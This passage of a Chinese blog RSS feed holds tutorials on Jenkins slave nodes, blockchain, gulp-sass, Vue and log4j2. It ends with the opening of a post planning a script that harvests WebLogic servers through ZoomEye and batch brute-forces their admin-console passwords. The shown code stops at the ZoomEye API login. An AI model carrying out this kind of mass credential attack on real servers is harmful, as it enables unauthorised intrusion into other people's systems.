&lt;p&gt;关于Jenkins的安装，根据个人使用过一段时间来说，不推荐使用docker来安装，推荐直接安装。Jenkins只需要装在master即可。Jenkins的安装教程：https://www.cnblogs.com/stulzq/p/9291237.html&lt;/p&gt;
&lt;h2 id=&quot;三.从节点的环境准备&quot;&gt;三.从节点的环境准备&lt;/h2&gt;
&lt;p&gt;根据你是用的源代码管理工具git或者svn来安装对于的工具，还有需要安装可能会构建的项目所需的环境，比如.NET Core 项目就需要安装 .NET Core SDK，JAVA项目就需要安装JAVA环境。&lt;strong&gt;从节点无需安装Jenkins&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;1.确保Master和Slave之间能相互通信。&lt;/p&gt;
&lt;p&gt;2.master执行以下shell命令，确保master能通过ssh登录slave&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;#生成秘钥 生成以后我这里保存在 /root/.ssh/id_rsa 记住这个位置
ssh-keygen
#将秘钥发送到slave 此过程会输入slave密码
ssh-copy-id &amp;lt;从节点用户一般为root&amp;gt;@&amp;lt;从节点ip&amp;gt;
#执行ssh命令进行登录
ssh &amp;lt;从节点用户一般为root&amp;gt;@&amp;lt;从节点ip&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;四.建立结点&quot;&gt;四.建立结点&lt;/h2&gt;
&lt;p&gt;打开Jenkins -&amp;gt; 系统管理 -&amp;gt; 管理节点 -&amp;gt; 新建节点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231908197-128509807.png&quot; alt=&quot;1531320204719&quot;/&gt;&lt;/p&gt;
&lt;p&gt;按图中标记的顺序来操作，输入结点名称，选择固定结点类型，然后点击OK按钮。&lt;/p&gt;
&lt;h2 id=&quot;五.配置节点&quot;&gt;五.配置节点&lt;/h2&gt;
&lt;p&gt;结点名称：随意填&lt;/p&gt;
&lt;p&gt;描述：随意填&lt;/p&gt;
&lt;p&gt;并发构建数：同时进行构建的最大数量，我这里设置为2&lt;/p&gt;
&lt;p&gt;工作目录：从节点上的jenkins工作目录，权限要给足。&lt;/p&gt;
&lt;p&gt;标签：随意填，我们将项目关联到节点时，可以根据标签来。&lt;/p&gt;
&lt;p&gt;用法：选择“尽可能的使用这个节点”，相当于设置结点优先级。&lt;/p&gt;
&lt;p&gt;启动方式：“Launch slave agent via SSH”，使用SSH由master连接到slave来执行任务&lt;/p&gt;
&lt;p&gt;主机：slave的ip&lt;/p&gt;
&lt;p&gt;Credentials：见后文&lt;/p&gt;
&lt;p&gt;Host Key Verification Strategy ：Manually trusted key Verification Strategy&lt;/p&gt;
&lt;p&gt;Require manual verification of initial connection ：选中&lt;/p&gt;
&lt;p&gt;可用性：尽量保持在线&lt;/p&gt;
&lt;p&gt;工具位置：不设置&lt;/p&gt;
&lt;p&gt;环境变量：不设置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231907790-106226018.png&quot; alt=&quot;1531320455275&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;credentials-的设置&quot;&gt;Credentials 的设置&lt;/h3&gt;
&lt;p&gt;点击“Add&quot;按钮，选择&quot;Jenkins&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231907359-1290323834.png&quot; alt=&quot;1531321510872&quot;/&gt;&lt;/p&gt;
&lt;p&gt;按照上图进行设置，设置以后，在界面上选择你刚刚设置的凭据。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231906963-321822470.png&quot; alt=&quot;1531321564125&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后点击“添加”按钮，便完成了对slave的添加。&lt;/p&gt;
&lt;h2 id=&quot;六.验证连接从节点&quot;&gt;六.验证连接从节点&lt;/h2&gt;
&lt;p&gt;由于上面我们使用了“Manually Trusted Key Verification Strategy”策略，所以，这里我们需要手动验证一下从节点的身份。&lt;/p&gt;
&lt;p&gt;点击我们刚刚新建的从节点 -&amp;gt; 点击【Trust SSH Host Key】,点击【是】：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231906661-1292251016.png&quot; alt=&quot;1531321887392&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击【Launch agent】：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231906209-1088325438.png&quot; alt=&quot;1531321935987&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置完成的节点列表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231905850-961909766.png&quot; alt=&quot;1531322007850&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在左侧会显示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231905306-1119105314.png&quot; alt=&quot;1531322038785&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;七.job和slave的关联&quot;&gt;七.Job和slave的关联&lt;/h2&gt;
&lt;p&gt;在Job配置，进行如何设置即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/668104/201807/668104-20180711231904844-524831950.png&quot; alt=&quot;1531322143615&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;
&lt;p&gt;https://blog.csdn.net/ruangong1203/article/details/78687450&lt;/p&gt;
</description>
<pubDate>Wed, 11 Jul 2018 15:20:00 +0000</pubDate>
<dc:creator>晓晨Master</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/stulzq/p/9297260.html</dc:identifier>
</item>
<item>
<title>1区块链底层技术-序 - *七秒钟记忆*</title>
<link>http://www.cnblogs.com/pangxt/p/blockchain_1.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pangxt/p/blockchain_1.html</guid>
<description>&lt;p&gt;　　每次在讲解区块链时，都会收到很多关于底层技术问题，感觉很有必要对区块链的底层技术进行分享，这也是我写这一系列文章的动力。&lt;/p&gt;
&lt;p&gt;　　2015年接触比特币（可惜当时没有囤币），作为一个在IT行业摸爬滚打多年，并且是技术出身的人，成功的被比特币底层技术-区块链所吸引。区块链与其说是新兴技术，不如说是新的理念、新的概念或者说是一种架构应用，是对目前中心化系统存在问题的解决方案。&lt;/p&gt;
&lt;p&gt;　　区块链涉及的技术都是很早就存在的，区块链把这些技术巧妙的结合在了一起，由于涉及到的知识领域比较多，从而增加了区块链的研发和学习难度。为了能让大家了解区块链底层技术，忙里偷闲，对区块链底层技术进行了简单整理，希望对大家学习区块链有所帮助，如果发现问题请大家及时指正，以免造成误导。&lt;/p&gt;
&lt;div readability=&quot;15&quot;&gt;
&lt;p&gt;　　互联网上的贸易，几乎都需要借助金融机构作为可资信赖的第三方来处理电子支付信息。虽然在绝大多数情况下这类系统都运作良好，但是这类系统仍然内生性地受制于“基于信用的模式”(trust based model)的弱点。人们无法实现完全不可逆的交易，因为金融机构总是不可避免地会出面协调争端。而金融中介的存在，也会增加交易的成本，并且限制了实际可行的最小交易规模，也限制了日常的小额支付交易。并且潜在的损失还在于，很多商品和服务本身是无法退货的，如果缺乏不可逆的支付手段，互联网的贸易就大大受限。因为有潜在的退款的可能，就需要交易双方拥有信任。此外，因为商家也必须对自己的客户小心提防，所以会向客户索取完全不必要的个人信息。而实际的商业行为中，一定比例的欺诈性客户也被认为是不可避免的，相关损失视作销售费用处理。而在使用物理现金的情况下，因为此时没有第三方信用中介的存在，这些销售费用和支付问题上的不确定性却是可以避免的。&lt;/p&gt;
&lt;p&gt;　　所以，我们非常需要这样一种电子支付系统，它基于密码学原理而不基于信用，使得任何达成一致的双方，能够直接进行支付，从而不需要第三方中介的参与。杜绝回滚(reverse)支付交易的可能，这就可以保护特定的卖家免于欺诈；而对于想要保护买家的人来说，在此环境下设立通常的第三方担保机制也可谓轻松加愉快。在这篇论文中，我们(we)将提出一种通过点对点分布式的时间戳服务器来生成依照时间前后排列并加以记录的电子交易证明，从而解决双重支付问题。只要诚实的节点所控制的计算能力的总和，大于有合作关系的(cooperating)攻击者的计算能力的总和，该系统就是安全的。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;　　上面摘自中本聪论文，从中本聪的论文（论文可自行搜索）可以看出，他只是想制作一种无中心监管的货币，并且可以自由交易，为了保证货币的安全性，采用了blockchain技术，可见区块链最初是作为比特币的记账平台或者比特币数据存储平台。&lt;/p&gt;
&lt;p&gt;　　很多文章提到过，区块链使用到了密码学，博弈论，数字货币，分布式等诸多理论，这些或许是中本聪事先就设计好的，也有可能是后来人的分析，总之不管怎么说，区块链是一门很综合的学科，要想学好区块链并不容易。&lt;/p&gt;
&lt;p&gt;　　那么什么是区块链？下面是我个人认为比较贴切的解释，区块链是由多方参与共同维护的一个持续增长的分布式数据存储结构，通过密码学算法把一段时间系统内的全部信息打包成一个数据块，并且使用hash作为当前块的标识，用于与下一区块进行连接，从而形成以块数据为基础，带有时间戳的头尾相连的链表式数据结构，其核心在于通过分布式网络，时序不可篡改的密码学账本及分布式共识机制建立彼此之间的信任关系。&lt;/p&gt;
&lt;p&gt;　　对于区块链，网上出现很多批判性的言论，这个没有错，任何新生事物都需要时间和实践来验证，比如发现了区块链存在的重大问题，这也充分证明大家都在为这方面在努力，也是一种推动，最终能不能给人类进步带来帮助，才是我们迫切需要解决的问题。目前大家讨论比较火热的是币圈，链圈，网上到处可见“薅羊毛”，“割韭菜”，抛开现在链圈或是币圈的纷争，一个技术如果不能解决现实中存在的问题，终将失败。&lt;/p&gt;
</description>
<pubDate>Wed, 11 Jul 2018 15:20:00 +0000</pubDate>
<dc:creator>*七秒钟记忆*</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pangxt/p/blockchain_1.html</dc:identifier>
</item>
<item>
<title>【gulp-sass】本地搭建sass开发环境 - 海瑞菌·博客</title>
<link>http://www.cnblogs.com/wuhairui/p/9296974.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wuhairui/p/9296974.html</guid>
<description>&lt;p&gt;首先去官网下载一下nodejs。&lt;/p&gt;
&lt;p&gt;然后安装gulp：&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;    选择一个目录执行命令行：npm init，一直回车生成package.json文件&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/SpukN8Pv_JCaz.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/pHp7brc8_LUaO.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    再执行命令：npm install gulp --save-dev，安装gulp依赖包到本目录。（安装成功）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/STsyTGFI_5A92.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    再执行：npm install gulp-ruby-sass --save-dev，安装ruby-sass依赖包。（安装成功）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/zDOXf4mY_dH9F.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    再执行：npm install gulp-sass，安装sass依赖包。（安装完成）&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/gpTUQ5DM_b2uN.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    在当前目录新建文件：gulpfile.js （gulp的入口文件）&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/xIWOdA2v_PqE4.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;键入gulp任务代码：&lt;/p&gt;
&lt;p&gt;引入包-&amp;gt;创建sass与watch任务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/OWhNNeDO_U4j7.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;在命令行执行gulp watch：&lt;/p&gt;
&lt;p&gt;进入gulp监听sass状态（保存scss文件，即可将执行sass任务）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/KWuArV5a_hdd4.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;如：这是scss，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/yLpHghgQ_tIeS.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将生成：这是css，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bdn.135editor.com/files/users/93/938573/201807/ZyZkjOp7_fZZM.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 11 Jul 2018 15:19:00 +0000</pubDate>
<dc:creator>海瑞菌&amp;#183;博客</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wuhairui/p/9296974.html</dc:identifier>
</item>
<item>
<title>（二）vue常用7个属性 - 狗尾草的博客</title>
<link>http://www.cnblogs.com/bgwhite/p/9297221.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bgwhite/p/9297221.html</guid>
<description>&lt;div readability=&quot;7&quot;&gt;
&lt;p&gt;学习vue我们必须之到它的7个属性，8个 方法，以及7个指令。787原则&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;el属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;data属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;template属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;methods属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;render属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;computed属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;用来计算&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;watch属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;watch:function(new,old){}&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;监听data中数据的变化&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;两个参数，一个返回新值，一个返回旧值，&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div readability=&quot;11&quot;&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;42&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&amp;lt;div id=&quot;app&quot;&amp;gt;
    {{msg}}
      &amp;lt;div&amp;gt;这是模板的第一种使用方法1&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
 
&amp;lt;template id=&quot;bot&quot;&amp;gt;这是模板的第三种使用方法，不常用3&amp;lt;/template&amp;gt;
&amp;lt;script&amp;gt;
&amp;lt;div id=&quot;bot&quot;&amp;gt;模板的第四种创建方法4&amp;lt;/div&amp;gt;
&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    var vm1 = new Vue({
        data: {
            msg: &quot;data属性&quot;
        },
        methods: {
            Personal:function () {
                console.log(&quot;methods方法存放方法&quot;)
            }
        },
        template: `&amp;lt;div&amp;gt;模板的第二种使用方法2&amp;lt;/div&amp;gt;`,
        //template：&quot;#bot&quot;,
        render: (createElement) =&amp;gt; {
            return createElement(&quot;h1&quot;,{&quot;class&quot;:&quot;类名&quot;，&quot;style&quot;:&quot;color: red&quot;},&quot;这一个render属性创建的虚拟dom&quot;)
        },
    })
&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;

&lt;/div&gt;
&lt;p&gt;methods和computed其中都可以写算法，有什么区别呢？&lt;/p&gt;

&lt;div readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;38&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
&amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;script src=&quot;javascript/vue.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt;
&amp;lt;div id=&quot;app&quot;&amp;gt;
    &amp;lt;p&amp;gt;{{message}}&amp;lt;/p&amp;gt; //直接在模板中绑定表达式
    &amp;lt;p&amp;gt;{{message.split('').reverse().join('')}}&amp;lt;/p&amp;gt; //运用计算属性
    &amp;lt;p&amp;gt;{{reverseMessage}}&amp;lt;/p&amp;gt; //运用methods方式
    &amp;lt;p&amp;gt;{{methodMessage()}}&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;script&amp;gt;
    var vm=new Vue({
         el:&quot;#app&quot;,
         data:{
             message:&quot;hello&quot;
         },
        computed:{
            reverseMessage:function(){
                 return this.message.split('').reverse().join('');
            }
        },
         methods:{
             methodMessage:function () {
                 return this.message.split('').reverse().join('');
             }
         }
    })
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;我在此将三种方式进行了比较。返回的结果是一样的，但在写法上computed计算属性的方式在用属性时不用加(),而methods方式在使用时要像方法一样去用，必须加().&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;两种方式在缓存上也大有不同，利用computed计算属性是将 reverseMessage与message绑定，只有当message发生变化时才会触发reverseMessage，而methods方式是每次进入页面都要执行该方法，但是在利用实时信息时，比如显示当前进入页面的时间，必须用methods方式&lt;/p&gt;
&lt;p&gt;以上就是vue常用的7个属性，当然vue的属性可不知这些，开发需要的话可以 在官网查阅剩余属性。狗尾草和大家一起加油，技术改变世界！&lt;/p&gt;
</description>
<pubDate>Wed, 11 Jul 2018 15:11:00 +0000</pubDate>
<dc:creator>狗尾草的博客</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/bgwhite/p/9297221.html</dc:identifier>
</item>
<item>
<title>log4j2分析总结（一） - 阳光温暖</title>
<link>http://www.cnblogs.com/zhenghengbin/p/9297211.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhenghengbin/p/9297211.html</guid>
<description>&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;现在公司用log4j2 进行日志记录,我也看了相关的资料，现在进行记录学习总结下&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;整体结构&quot;&gt;整体结构&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://p7zk4x9pv.bkt.clouddn.com/20180711221924.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Appenders里设置日志的输出方式、级别和格式&lt;/li&gt;
&lt;li&gt;Loggers里设置全局的级别和绑定appenders里的name&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;简单代码demo&quot;&gt;简单代码demo&lt;/h3&gt;
&lt;h4 id=&quot;加载依赖&quot;&gt;加载依赖&lt;/h4&gt;
&lt;p&gt;登录官网,找到maven依赖&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;dependencies&amp;gt;
  &amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.11.0&amp;lt;/version&amp;gt;
  &amp;lt;/dependency&amp;gt;
  &amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.11.0&amp;lt;/version&amp;gt;
  &amp;lt;/dependency&amp;gt;
&amp;lt;/dependencies&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;新建一个log4j2.xml&quot;&gt;新建一个log4j2.xml&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;Configuration status=&quot;WARN&quot;&amp;gt;
    &amp;lt;Appenders&amp;gt;
        &amp;lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&amp;gt;
            &amp;lt;PatternLayout pattern=&quot;%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n&quot; /&amp;gt;
        &amp;lt;/Console&amp;gt;
    &amp;lt;/Appenders&amp;gt;
    &amp;lt;Loggers&amp;gt;
        &amp;lt;Root level=&quot;TRACE&quot;&amp;gt;
            &amp;lt;AppenderRef ref=&quot;Console&quot; /&amp;gt;
        &amp;lt;/Root&amp;gt;
    &amp;lt;/Loggers&amp;gt;
&amp;lt;/Configuration&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;新建一个测试类&quot;&gt;新建一个测试类&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;    Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
    logger.trace(&quot;trance level&quot;);
    logger.debug(&quot;debug level&quot;);
    logger.info(&quot;info level&quot;);
    logger.warn(&quot;warn level&quot;);
    logger.error(&quot;error level&quot;);
    logger.fatal(&quot;fatal level&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;输出结果&quot;&gt;输出结果&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;22:36:42.966 [main] TRACE  - trance level
22:36:42.968 [main] DEBUG  - debug level
22:36:42.969 [main] INFO   - info level
22:36:42.969 [main] WARN   - warn level
22:36:42.969 [main] ERROR  - error level
22:36:42.969 [main] FATAL  - fatal level&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;细节分析&quot;&gt;细节分析&lt;/h3&gt;
&lt;p&gt;首先 我们要明白日志的级别&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;日志级别从低到高分为TRACE &amp;lt; DEBUG &amp;lt; INFO &amp;lt; WARN &amp;lt; ERROR &amp;lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;configuration&quot;&gt;Configuration&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;Configuration为根节点，有一个status属性，这个属性表示log4j2本身的日志信息打印级别&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;appenders&quot;&gt;Appenders&lt;/h4&gt;
&lt;p&gt;建议大家去官网看看，现在支持很多种appender，并且官网上也有示例。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p7zk4x9pv.bkt.clouddn.com/20180711224908.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Console节点中的PatternLayout定义了输出日志时的格式&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;%d{HH:mm:ss.SSS} 表示输出到毫秒的时间&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;%t 输出当前线程名称&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;%-5level 输出日志级别，-5表示左对齐并且固定输出5个字符，如果不足在右边补0&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;%logger 输出logger名称，因为Root Logger没有名称，所以没有输出&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;%msg 日志文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;%n 换行&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其他的参数意义，大家遇到自行搜索&lt;/p&gt;
&lt;h4 id=&quot;自定义appender&quot;&gt;自定义Appender&lt;/h4&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;我们发现这个log4j2是支持我们自定义的Appender的，很好的体现了开闭原则：对扩展支持，对修改关闭。再想想渣渣猿我自己写的代码，果然大神们写的代码还是很six的，这里不具体展开详细介绍，我现在对这一块也不是很熟悉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;注意事项&quot;&gt;注意事项&lt;/h3&gt;
&lt;p&gt;大家最好结合阿里规约中日志的规约，大家自行查看。摘出其中一句话，供大家参考&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;大量地输出无效日志，不利于系统性能提升，也不利于快速定位错误点。记录日志时请&lt;br/&gt;思考：这些日志真的有人看吗？看到这条日志你能做什么？能不能给问题排查带来好处？&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 11 Jul 2018 15:10:00 +0000</pubDate>
<dc:creator>阳光温暖</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhenghengbin/p/9297211.html</dc:identifier>
</item>
<item>
<title>python写批量weblogic爆破脚本 - 东京$</title>
<link>http://www.cnblogs.com/haq5201314/p/9297208.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/haq5201314/p/9297208.html</guid>
<description>&lt;h2&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;整理笔记的时候，发现了weblogic的攻击方法。心里打着算盘看看怎么写&lt;/p&gt;
&lt;p&gt;个批量的弱口令爆破脚本。得出了以下思路&lt;/p&gt;

&lt;h2&gt;思路：&lt;/h2&gt;
&lt;p&gt;1.利用钟馗之眼采集weblogic的网站，将IP写入到txt&lt;/p&gt;
&lt;p&gt;2.添加后台路径，判断是否能成功连接，并且没有过滤表里面的错误。写入到txt&lt;/p&gt;
&lt;p&gt;3.转换路径，将后台路径转换为表单请求的路径写入到txt&lt;/p&gt;
&lt;p&gt;4.判断是账号和密码是否成功&lt;/p&gt;
&lt;p&gt;详细思路请参考：https://www.jianshu.com/p/e97b109ace40 （同时也是一份攻击weblogic服务的好文章）&lt;/p&gt;

&lt;h2&gt;代码：&lt;/h2&gt;
&lt;p&gt;weblogicpass.py&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; requests


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; zoomeye():
  sjian&lt;/span&gt;=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;w&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
  sjian.close()

  data&lt;/span&gt;={&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;username&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;钟馗之眼的登录邮箱&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;password&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;钟馗之眼的登录密码&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}
  url&lt;/span&gt;=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://api.zoomeye.org/user/login&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
  login&lt;/span&gt;=requests.post(url=url,json=&lt;span&gt;data)
  access_token&lt;/span&gt;=login.json()[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;access_token&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

